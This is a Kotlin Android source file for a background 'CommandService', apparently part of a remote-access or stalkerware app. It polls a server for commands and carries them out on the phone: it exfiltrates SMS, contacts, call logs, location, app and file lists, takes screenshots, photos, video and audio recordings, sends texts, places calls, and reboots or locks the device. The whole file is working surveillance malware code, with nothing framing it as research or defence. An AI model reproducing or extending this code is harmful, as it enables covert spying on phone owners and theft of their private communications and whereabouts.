package com.abuzahra.admin.service

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.ContentResolver
import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.database.Cursor
import android.location.Location
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.provider.Settings
import android.telephony.SmsManager
import android.telephony.TelephonyManager
import android.util.Log
import android.widget.Toast
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.abuzahra.admin.MainActivity
import com.abuzahra.admin.R
import com.abuzahra.admin.manager.PreferenceManager
import com.abuzahra.admin.network.ApiService
import com.abuzahra.admin.network.WebSocketManager
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import com.google.gson.JsonObject
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class CommandService : Service() {
    
    companion object {
        private const val TAG = "CommandService"
        private const val CHANNEL_ID = "abu_zahra_service"
        private const val NOTIFICATION_ID = 1
        
        private const val HEARTBEAT_INTERVAL = 30000L
        private const val COMMAND_CHECK_INTERVAL = 5000L
    }
    
    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
    
    private var apiService: ApiService? = null
    private var webSocketManager: WebSocketManager? = null
    private var fusedLocationClient: FusedLocationProviderClient? = null
    
    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Service onCreate")
        
        apiService = ApiService.getInstance(this)
        webSocketManager = WebSocketManager.getInstance(this)
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        
        createNotificationChannel()
        startForegroundWithNotification()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service onStartCommand")
        
        startBackgroundTasks()
        webSocketManager?.connect()
        
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        Log.d(TAG, "Service onDestroy")
        serviceJob.cancel()
        webSocketManager?.disconnect()
        super.onDestroy()
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                getString(R.string.service_channel_name),
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = getString(R.string.service_channel_description)
                setShowBadge(false)
            }
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    private fun startForegroundWithNotification() {
        val notification = createNotification()
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }
    
    private fun createNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(getString(R.string.service_running))
            .setContentText(getString(R.string.service_connected))
            .setSmallIcon(R.drawable.ic_notification)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
    
    private fun startBackgroundTasks() {
        val deviceId = PreferenceManager.getInstance().getDeviceId()
        if (deviceId.isEmpty()) {
            Log.w(TAG, "No device ID, stopping service")
            stopSelf()
            return
        }
        
        // Heartbeat
        serviceScope.launch {
            while (isActive) {
                apiService?.sendHeartbeat(deviceId)
                delay(HEARTBEAT_INTERVAL)
            }
        }
        
        // Command polling
        serviceScope.launch {
            while (isActive) {
                try {
                    val commands = apiService?.getCommands(deviceId) ?: emptyList()
                    commands.forEach { command ->
                        processCommand(command)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error fetching commands", e)
                }
                delay(COMMAND_CHECK_INTERVAL)
            }
        }
    }
    
    private fun processCommand(command: JsonObject) {
        val type = command.get("type")?.asString ?: return
        val action = command.get("action")?.asString ?: return
        val commandId = command.get("id")?.asString ?: return
        val fullCommand = command.get("command")?.asString ?: "$type/$action"
        val params = command.get("params")?.asJsonObject ?: JsonObject()
        
        Log.d(TAG, "Processing command: $fullCommand (type=$type, action=$action)")
        
        serviceScope.launch {
            var result = JsonObject()
            result.addProperty("commandId", commandId)
            result.addProperty("command", fullCommand)
            
            try {
                when (type) {
                    "screen" -> result = handleScreenCommand(action, params, commandId)
                    "camera" -> result = handleCameraCommand(action, params)
                    "audio" -> result = handleAudioCommand(action, params)
                    "location" -> result = handleLocationCommand(action, commandId)
                    "sms" -> result = handleSmsCommand(action, params, commandId)
                    "contacts" -> result = handleContactsCommand(action, commandId)
                    "call" -> result = handleCallCommand(action, params, commandId)
                    "apps" -> result = handleAppsCommand(action, params, commandId)
                    "app" -> result = handleAppsCommand(action, params, commandId)
                    "file" -> result = handleFileCommand(action, params)
                    "system" -> result = handleSystemCommand(action, params)
                    "data" -> result = handleDataCommand(action, params, commandId)
                    else -> {
                        Log.w(TAG, "Unknown command type: $type")
                        result.addProperty("success", false)
                        result.addProperty("error", "Unknown command type: $type")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error executing command", e)
                result.addProperty("success", false)
                result.addProperty("error", e.message ?: "Unknown error")
            }
            
            // Send result back to server
            val deviceId = PreferenceManager.getInstance().getDeviceId()
            apiService?.sendCommandResult(deviceId, commandId, result)
        }
    }
    
    // ==================== SMS Commands ====================
    private suspend fun handleSmsCommand(action: String, params: JsonObject, commandId: String): JsonObject {
        val result = JsonObject()
        
        when (action) {
            "get" -> {
                val messages = getSmsMessages()
                result.addProperty("success", true)
                result.add("data", messages)
                result.addProperty("count", messages.size())
            }
            "send" -> {
                val number = params.get("number")?.asString
                val message = params.get("message")?.asString
                
                if (number != null && message != null) {
                    sendSms(number, message)
                    result.addProperty("success", true)
                    result.addProperty("message", "SMS sent to $number")
                } else {
                    result.addProperty("success", false)
                    result.addProperty("error", "Missing number or message")
                }
            }
            else -> {
                result.addProperty("success", false)
                result.addProperty("error", "Unknown SMS action: $action")
            }
        }
        
        return result
    }
    
    private fun getSmsMessages(): com.google.gson.JsonArray {
        val messages = com.google.gson.JsonArray()
        
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "No SMS permission")
            return messages
        }
        
        val uri: Uri = Telephony.Sms.CONTENT_URI
        val projection = arrayOf(
            Telephony.Sms._ID,
            Telephony.Sms.ADDRESS,
            Telephony.Sms.BODY,
            Telephony.Sms.DATE,
            Telephony.Sms.TYPE
        )
        
        val cursor: Cursor? = contentResolver.query(uri, projection, null, null, "${Telephony.Sms.DATE} DESC LIMIT 100")
        
        cursor?.use {
            while (it.moveToNext()) {
                val msg = JsonObject()
                msg.addProperty("id", it.getLong(0))
                msg.addProperty("address", it.getString(1))
                msg.addProperty("body", it.getString(2))
                msg.addProperty("date", it.getLong(3))
                msg.addProperty("type", it.getInt(4))  // 1=received, 2=sent
                messages.add(msg)
            }
        }
        
        return messages
    }
    
    private fun sendSms(number: String, message: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
            val smsManager = SmsManager.getDefault()
            smsManager.sendTextMessage(number, null, message, null, null)
            Log.d(TAG, "SMS sent to $number")
        }
    }
    
    // ==================== Contacts Commands ====================
    private suspend fun handleContactsCommand(action: String, commandId: String): JsonObject {
        val result = JsonObject()
        
        when (action) {
            "get" -> {
                val contacts = getContacts()
                result.addProperty("success", true)
                result.add("data", contacts)
                result.addProperty("count", contacts.size())
            }
            else -> {
                result.addProperty("success", false)
                result.addProperty("error", "Unknown contacts action: $action")
            }
        }
        
        return result
    }
    
    private fun getContacts(): com.google.gson.JsonArray {
        val contacts = com.google.gson.JsonArray()
        
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "No contacts permission")
            return contacts
        }
        
        val cursor: Cursor? = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID
            ),
            null, null,
            "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
        )
        
        cursor?.use {
            while (it.moveToNext()) {
                val contact = JsonObject()
                contact.addProperty("name", it.getString(0))
                contact.addProperty("number", it.getString(1))
                contact.addProperty("id", it.getLong(2))
                contacts.add(contact)
            }
        }
        
        return contacts
    }
    
    // ==================== Call Log Commands ====================
    private suspend fun handleCallCommand(action: String, params: JsonObject, commandId: String): JsonObject {
        val result = JsonObject()
        
        when (action) {
            "get", "get_log" -> {
                val calls = getCallLog()
                result.addProperty("success", true)
                result.add("data", calls)
                result.addProperty("count", calls.size())
            }
            "make" -> {
                val number = params.get("number")?.asString
                if (number != null) {
                    makeCall(number)
                    result.addProperty("success", true)
                    result.addProperty("message", "Calling $number")
                } else {
                    result.addProperty("success", false)
                    result.addProperty("error", "Missing number")
                }
            }
            else -> {
                result.addProperty("success", false)
                result.addProperty("error", "Unknown call action: $action")
            }
        }
        
        return result
    }
    
    private fun getCallLog(): com.google.gson.JsonArray {
        val calls = com.google.gson.JsonArray()
        
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "No call log permission")
            return calls
        }
        
        val cursor: Cursor? = contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE
            ),
            null, null,
            "${CallLog.Calls.DATE} DESC LIMIT 100"
        )
        
        cursor?.use {
            while (it.moveToNext()) {
                val call = JsonObject()
                call.addProperty("number", it.getString(0))
                call.addProperty("name", it.getString(1) ?: "Unknown")
                call.addProperty("date", it.getLong(2))
                call.addProperty("duration", it.getLong(3))
                call.addProperty("type", it.getInt(4))  // 1=incoming, 2=outgoing, 3=missed
                calls.add(call)
            }
        }
        
        return calls
    }
    
    private fun makeCall(number: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
            val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$number"))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        }
    }
    
    // ==================== Location Commands ====================
    private suspend fun handleLocationCommand(action: String, commandId: String): JsonObject {
        val result = JsonObject()
        
        when (action) {
            "get" -> {
                val location = getLastLocation()
                if (location != null) {
                    result.addProperty("success", true)
                    result.addProperty("latitude", location.latitude)
                    result.addProperty("longitude", location.longitude)
                    result.addProperty("accuracy", location.accuracy)
                    result.addProperty("timestamp", location.time)
                } else {
                    result.addProperty("success", false)
                    result.addProperty("error", "Could not get location")
                }
            }
            "live" -> {
                // Start live location tracking
                val intent = Intent(this, LocationService::class.java)
                intent.action = "start_live"
                startService(intent)
                result.addProperty("success", true)
                result.addProperty("message", "Live location started")
            }
            "stop" -> {
                val intent = Intent(this, LocationService::class.java)
                intent.action = "stop"
                startService(intent)
                result.addProperty("success", true)
                result.addProperty("message", "Location tracking stopped")
            }
            else -> {
                result.addProperty("success", false)
                result.addProperty("error", "Unknown location action: $action")
            }
        }
        
        return result
    }
    
    private suspend fun getLastLocation(): Location? = withContext(Dispatchers.IO) {
        if (ContextCompat.checkSelfPermission(this@CommandService, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return@withContext null
        }
        
        try {
            var lastLocation: Location? = null
            val latch = java.util.concurrent.CountDownLatch(1)
            
            fusedLocationClient?.lastLocation?.addOnSuccessListener { location ->
                lastLocation = location
                latch.countDown()
            }?.addOnFailureListener {
                latch.countDown()
            }
            
            latch.await(10, java.util.concurrent.TimeUnit.SECONDS)
            lastLocation
        } catch (e: Exception) {
            Log.e(TAG, "Error getting location", e)
            null
        }
    }
    
    // ==================== Apps Commands ====================
    private suspend fun handleAppsCommand(action: String, params: JsonObject, commandId: String): JsonObject {
        val result = JsonObject()
        
        when (action) {
            "get", "list" -> {
                val apps = getInstalledApps()
                result.addProperty("success", true)
                result.add("data", apps)
                result.addProperty("count", apps.size())
            }
            "open" -> {
                val packageName = params.get("package")?.asString
                if (packageName != null) {
                    openApp(packageName)
                    result.addProperty("success", true)
                    result.addProperty("message", "App opened: $packageName")
                } else {
                    result.addProperty("success", false)
                    result.addProperty("error", "Missing package name")
                }
            }
            else -> {
                result.addProperty("success", false)
                result.addProperty("error", "Unknown apps action: $action")
            }
        }
        
        return result
    }
    
    private fun getInstalledApps(): com.google.gson.JsonArray {
        val apps = com.google.gson.JsonArray()
        val pm = packageManager
        
        val packages = pm.getInstalledPackages(PackageManager.GET_META_DATA)
        for (pkg in packages) {
            val app = JsonObject()
            app.addProperty("name", pm.getApplicationLabel(pkg.applicationInfo).toString())
            app.addProperty("package", pkg.packageName)
            app.addProperty("version", pkg.versionName ?: "Unknown")
            app.addProperty("system", (pkg.applicationInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0)
            apps.add(app)
        }
        
        return apps
    }
    
    private fun openApp(packageName: String) {
        val intent = packageManager.getLaunchIntentForPackage(packageName)
        if (intent != null) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        }
    }
    
    // ==================== Data Commands ====================
    private suspend fun handleDataCommand(action: String, params: JsonObject, commandId: String): JsonObject {
        val result = JsonObject()
        
        when (action) {
            "get" -> {
                val dataType = params.get("type")?.asString
                when (dataType) {
                    "info" -> {
                        val info = getDeviceInfo()
                        result.addProperty("success", true)
                        result.add("data", info)
                    }
                    "battery" -> {
                        val battery = getBatteryInfo()
                        result.addProperty("success", true)
                        result.add("data", battery)
                    }
                    else -> {
                        result.addProperty("success", false)
                        result.addProperty("error", "Unknown data type: $dataType")
                    }
                }
            }
            else -> {
                result.addProperty("success", false)
                result.addProperty("error", "Unknown data action: $action")
            }
        }
        
        return result
    }
    
    private fun getDeviceInfo(): JsonObject {
        val info = JsonObject()
        
        info.addProperty("brand", Build.BRAND)
        info.addProperty("model", Build.MODEL)
        info.addProperty("manufacturer", Build.MANUFACTURER)
        info.addProperty("device", Build.DEVICE)
        info.addProperty("android", Build.VERSION.RELEASE)
        info.addProperty("sdk", Build.VERSION.SDK_INT)
        info.addProperty("id", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
        
        val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            info.addProperty("imei", tm.imei ?: "Unknown")
            info.addProperty("phone", tm.line1Number ?: "Unknown")
        }
        
        return info
    }
    
    private fun getBatteryInfo(): JsonObject {
        val battery = JsonObject()
        
        val ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        val batteryStatus = registerReceiver(null, ifilter)
        
        batteryStatus?.let {
            val level = it.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1)
            val scale = it.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1)
            val status = it.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1)
            val plugged = it.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1)
            
            battery.addProperty("level", (level * 100 / scale.toFloat()).toInt())
            battery.addProperty("charging", status == android.os.BatteryManager.BATTERY_STATUS_CHARGING)
            battery.addProperty("plugged", plugged != 0)
        }
        
        return battery
    }
    
    // ==================== Screen Commands ====================
    private suspend fun handleScreenCommand(action: String, params: JsonObject, commandId: String): JsonObject {
        val result = JsonObject()
        
        when (action) {
            "screenshot" -> {
                val intent = Intent(this, ScreenStreamService::class.java)
                intent.action = "screenshot"
                intent.putExtra("commandId", commandId)
                startService(intent)
                result.addProperty("success", true)
                result.addProperty("message", "Screenshot initiated")
            }
            "stream_start" -> {
                val intent = Intent(this, ScreenStreamService::class.java)
                intent.action = "start"
                startService(intent)
                result.addProperty("success", true)
                result.addProperty("message", "Screen stream started")
            }
            "stream_stop" -> {
                val intent = Intent(this, ScreenStreamService::class.java)
                intent.action = "stop"
                startService(intent)
                result.addProperty("success", true)
                result.addProperty("message", "Screen stream stopped")
            }
            else -> {
                result.addProperty("success", false)
                result.addProperty("error", "Unknown screen action: $action")
            }
        }
        
        return result
    }
    
    // ==================== Camera Commands ====================
    private suspend fun handleCameraCommand(action: String, params: JsonObject): JsonObject {
        val result = JsonObject()
        
        val camera = params.get("camera")?.asString ?: "back"
        
        when (action) {
            "photo", "front_photo", "back_photo" -> {
                val intent = Intent(this, CameraStreamService::class.java)
                intent.action = "photo"
                intent.putExtra("camera", if (action == "front_photo") "front" else if (action == "back_photo") "back" else camera)
                startService(intent)
                result.addProperty("success", true)
                result.addProperty("message", "Photo captured with $camera camera")
            }
            "video_start" -> {
                val intent = Intent(this, CameraStreamService::class.java)
                intent.action = "start"
                intent.putExtra("camera", camera)
                startService(intent)
                result.addProperty("success", true)
                result.addProperty("message", "Video recording started")
            }
            "video_stop" -> {
                val intent = Intent(this, CameraStreamService::class.java)
                intent.action = "stop"
                startService(intent)
                result.addProperty("success", true)
                result.addProperty("message", "Video recording stopped")
            }
            else -> {
                result.addProperty("success", false)
                result.addProperty("error", "Unknown camera action: $action")
            }
        }
        
        return result
    }
    
    // ==================== Audio Commands ====================
    private suspend fun handleAudioCommand(action: String, params: JsonObject): JsonObject {
        val result = JsonObject()
        
        when (action) {
            "record", "record_start" -> {
                val duration = params.get("duration")?.asInt ?: 30
                val intent = Intent(this, AudioStreamService::class.java)
                intent.action = "start"
                intent.putExtra("duration", duration)
                startService(intent)
                result.addProperty("success", true)
                result.addProperty("message", "Audio recording started for ${duration}s")
            }
            "record_stop" -> {
                val intent = Intent(this, AudioStreamService::class.java)
                intent.action = "stop"
                startService(intent)
                result.addProperty("success", true)
                result.addProperty("message", "Audio recording stopped")
            }
            else -> {
                result.addProperty("success", false)
                result.addProperty("error", "Unknown audio action: $action")
            }
        }
        
        return result
    }
    
    // ==================== File Commands ====================
    private suspend fun handleFileCommand(action: String, params: JsonObject): JsonObject {
        val result = JsonObject()
        
        when (action) {
            "list" -> {
                val path = params.get("path")?.asString ?: "/storage/emulated/0/"
                val files = listFiles(path)
                result.addProperty("success", true)
                result.add("data", files)
            }
            else -> {
                result.addProperty("success", false)
                result.addProperty("error", "Unknown file action: $action")
            }
        }
        
        return result
    }
    
    private fun listFiles(path: String): com.google.gson.JsonArray {
        val files = com.google.gson.JsonArray()
        
        try {
            val dir = java.io.File(path)
            if (dir.exists() && dir.isDirectory) {
                dir.listFiles()?.forEach { file ->
                    val f = JsonObject()
                    f.addProperty("name", file.name)
                    f.addProperty("path", file.absolutePath)
                    f.addProperty("isDirectory", file.isDirectory)
                    f.addProperty("size", file.length())
                    f.addProperty("lastModified", file.lastModified())
                    files.add(f)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error listing files", e)
        }
        
        return files
    }
    
    // ==================== System Commands ====================
    private suspend fun handleSystemCommand(action: String, params: JsonObject): JsonObject {
        val result = JsonObject()
        
        when (action) {
            "reboot" -> {
                try {
                    val proc = Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot"))
                    proc.waitFor()
                    result.addProperty("success", true)
                    result.addProperty("message", "Rebooting device")
                } catch (e: Exception) {
                    result.addProperty("success", false)
                    result.addProperty("error", "Reboot failed: ${e.message}")
                }
            }
            "shutdown" -> {
                try {
                    val proc = Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot -p"))
                    proc.waitFor()
                    result.addProperty("success", true)
                    result.addProperty("message", "Shutting down")
                } catch (e: Exception) {
                    result.addProperty("success", false)
                    result.addProperty("error", "Shutdown failed: ${e.message}")
                }
            }
            "lock_phone" -> {
                val intent = Intent(this, AdminAccessibilityService::class.java)
                intent.action = "lock"
                startService(intent)
                result.addProperty("success", true)
                result.addProperty("message", "Phone locked")
            }
            else -> {
                result.addProperty("success", false)
                result.addProperty("error", "Unknown system action: $action")
            }
        }
        
        return result
    }
}
